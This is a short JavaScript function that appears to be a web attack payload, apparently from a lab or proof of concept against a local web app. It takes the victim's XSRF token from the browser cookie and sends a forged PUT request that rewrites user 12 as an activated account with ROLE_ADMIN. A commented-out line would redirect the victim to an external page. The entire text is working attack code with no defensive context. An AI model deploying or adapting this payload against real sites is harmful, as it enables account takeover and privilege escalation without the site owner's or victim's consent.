function executeScript() {
  fetch('http://localhost:8080/api/users',
  {
    method: 'PUT',
    headers: {
      'Content-Type': 'application/json',
      'X-XSRF-Token': document.cookie.split('XSRF-TOKEN=')[1].split(';')[0].trim(),

  },
  body:JSON.stringify({
  id:12,
  "activated" : true,
  "authorities": ["ROLE_ADMIN", "ROLE_USER"],
  login:'newuser101',
  firstName:'new101',
  lastName: 'user101',
  email:'user101@localhost',
}),
})
.then(response =>response.text())
.then(data=>console.log(data))
//.then(window.location.href = 'https://grannycat.github.io/mayphyu.github.io')
.catch(error=>console.error('Error', error));
}
